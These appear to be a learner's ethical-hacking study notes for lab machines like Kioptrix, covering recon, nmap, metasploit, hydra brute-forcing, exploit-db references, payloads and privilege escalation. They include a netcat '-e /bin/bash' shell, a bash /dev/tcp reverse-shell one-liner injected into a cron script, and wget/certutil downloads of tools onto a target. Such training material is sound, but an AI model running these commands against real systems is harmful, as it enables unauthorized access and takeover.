NOTE
Five stage of EH
	1. Reconnaissance: Active vs passive
	2. Scanning and Enumeration: Nmap, Nessus, Nikto, etc
	3. Gaining Access: Exploitation
	4. Maintaining Access
	5. Covering Tracks

TOOLS
Other:
wget:
	- download a file from web
	- ex: wget http://<ip>/<file>
Infomation Gathering:
- Google
- Burpsuite
- email: hunter.io, phonebook.cz, etc
- verify email: emailhippo.com, etc
- search for breach: dehashed.com($), etc
- Domain: crt.sh, OWASP Amass, etc
- Identifying Website tecnologies: builtwith.com, wappalyzer(web extention), whatweb, etc
- searchsploit: search exploit tools that exist in exploit database (https://www.exploit-db.com/). ex: searchsploit mod_ssl 2.8 (do not be too specific)

Scanning and Enumeration:
- netdiscover(find active ip in lan)
- nmap:
	-T<value 1-5> to determind speed
	-p <port> is port -p- mean all port
	-A all or everything
	-when scan udp don't put -A and -p- because it take time to scan
	example: nmap -T3 -p- -A 10.0.2.15
	-sn option is for ping scan. ex: nmap -sn 10.0.2.0/24 (to find active machines)
- nikto(scan web):
	-h is host	
	example: nikto -h http://10.0.2.15
- dirbuster: is a file/directory penetration testing tool with a Graphic User Interface (GUI) that is used to brute force directories and file names on web application servers.
- metaploit:
	1. type 'search <something>' to search for what you need  
	2. type 'use <something>' to use
	3. type 'info' to search for info or 'options' to get an options
	4. type 'set rhosts <ip>' to set a target or use 'set <options> <any>' to the option
	5. type 'run' or 'exploit' to run an exploit on target
	- type 'options' to see script, payload, you are using and many more
	- set payload <option>
- smbclient:
	- is to connect to smb
	- L option is use to list out a share files
	- example: smbclient -L \\\\10.0.2.15\\
- nessus: scan web vulnerabilities etc
- dnsrecon:
	- use to find domain if target have port 53 open
	-r range (in this example we use local host)
	-d domain (just put what ever because it need)
	-n target
	- ex: dnsrecon -r 127.0.0.0/24 -n 10.0.2.80 -d blah
	
- dirb:
	- tool like dirbuster
	- example: dirb <url> <wordlist>
Gaining Access: Exploitation
- netcat:
	- v option is for verbose(more detail)
	- l option is for listen it use to listen to connection
	- n option is numeric-only IP addresses, no DNS
	- p option is for port 
	- e option is for excute. ex: nc 4444 -e /bin/bash (this will give bash shell to the listener, the machine that use this option will give other the shell it doesn't matter if you are listener or connector)
	- ex for listener: netcat -nvlp <port>
- hydra:
	-l is login or user name
	-P password
	-t run TASKS number of connects in parallel (default: 16)
	-v / -V verbose mode / show login+pass combination for each attempt
	- hydra -l root -P rockyou.txt ssh://<ip>:<port> -t 4 -V
STARTING
1. find ip of the target if target is in lan then do netdiscover
2. scan target to find any door we can access for example: target open port 80,22,443 or other services by using tool like nmap, nessus, nikto
3. find version of service that it run
port80:
-apache: 
	1. version might show up when trying to redirect but page not found happen
	2. scan using nikto
	3. using burp suit and look for response
port22
-shh:
	1. to find ssh version then try to ssh into target sometime there is a banner that tell ssh version etc.
	ex: shh -i <key file> <ip>
	-i identify file, Selects a file from which the identity (private key) for public key authentication is read.You  can also specify a public key file to use the corresponding private key that is loaded in ssh-agent(1) when the private key file  is  not present  locally. The default is ~/.ssh/id_rsa, ~/.ssh/id_ecdsa, ~/.ssh/id_ecdsa_sk, ~/.ssh/id_ed25519, ~/.ssh/id_ed25519_sk and ~/.ssh/id_dsa. Identity files may also be specified on a per-host basis in the configuration file. It is possible to have multiple -i options (and multiple identities specified in configuration files). If no certificates have been explicitly specified by the CertificateFile directive, ssh will also try to load certificate information from the file name obtained by appending -cert.pub to identity filenames.

	ex: shh <ip> -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes128-cbc
	note: the example above is not normally use because it only apply for older machine
	-OkexAlgorithms=+<option> (use when error says 'no matching key exchange method found' for newer version ssh they will give some option after 'Their offer:')
	-oHostKeyAlgorithms=+<option> (use when error says 'no matching host key type found')
	-c <option>  (c option is cipher and it use when error says 'no matching cipher found') 
port139:
	1.use smbclient to connect to smb and find if target allow anonymous access and try to get as much info as possible
4. take note
- webpage they are running and what version is it. ex: apache 1.3.20
- any error when redirect a webpage. ex: 404 error page
- does 404 error provide any disclose info
- port that open
- etc
- example: this is a note of kioptrix machine
10.0.2.4 (kali)
10.0.2.15 (kioptrix)
80 - 10.0.2.15
80/443 - potentially vulnereble to openfuck, (https://www.exploit-db.com/exploits/47080), (https://github.com/heltonWernik/OpenLuck)
139 - Potentially vulnerable to tran2open, (https://www.exploit-db.com/exploits/10)
default webpage - apache
Info disclosure - 404 page
Info disclosure - server header disclose version info
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell.
Webalizer Version 2.01 - http://10.0.2.15/usage/usage_200909.html
SMB: Unix (Samba 2.2.1a)
OpenSSH 2.9p2 (protocol 1.99)
Apache/1.3.20 (Unix)
5. do research a from easy to hard like port 80, 443, 139/smb is the most easiest way to target then go after ssh etc. ex: search for exploit for mod_ssl 2.8.7 on google or using searchsploit
6. start exploiting:
	- use metasploit:
	- install exploit on web
	


EXTRA
reverse shell: is when target connect to us. to reverse shell make sure you machine is listen for connection.
bind shell: is when we connect to target
payload: is a code that we send to target machine to get access.
	-none stage payload:
	send exploit shellcode all at once
	larger in size and won't always work
	ex in metasploit: windows/meterpreter_reverse_tcp
	-staged payload:
	sends paylaod in stages
	can be less stable
	ex in metasploit: windows/meterpreter/reverse_tcp
	note: when we exploit if stage payload not working then switch nonestage payload
credential stuffing: injecting breached credentials in hopes of account take over
password spraying: injecting breached user name with one or two password.

NOTE
- when reverse shell make sure your machine is listen to the connection. no need to this your self when using metasploit.
- try to send melicious code to target webserver like reverse shell code if there something like 'upload image' etc in the web.
if you get a shell but don't have much auth and you want to scan machine to see machine details and files and folder you can use 'linpeas.sh' or 'winpeas' for window by downloads it from github then host a web server in order to install it on target machine using tools like wget.
- in some case target have a script file that automate stuff automatically and that file have a permission that user don't so we can take advantage of that scipt by changing the content of the script into a reverse shell script like 'bash -i >& /dev/tcp/10.0.2.4/8081 0>&1' this is a one line reverse shell script that give out root and also you can check if that file is automate or not in crontab 'crontab -l', 'crontab -u root -l'or systemctl 'systemctl list-timers' if you can't find it then try a tools like pspy by downlaod it from github
- if you log in as low prev user then type 'history' to check history and type 'sudo -l' to find if any command we can run with sudo with out password. search google 'gtfobins', it a website that tell you many prev escalations way.

- use 'certutil -urlcache -f http://<ip>/<file>' to download files from web server (window machine)
- scan samba using enum4linux: Enum4linux is a tool for enumerating information from Windows and Samba systems. ex: enum4linux -a 10.10.179.141 | tee enum4linux.log
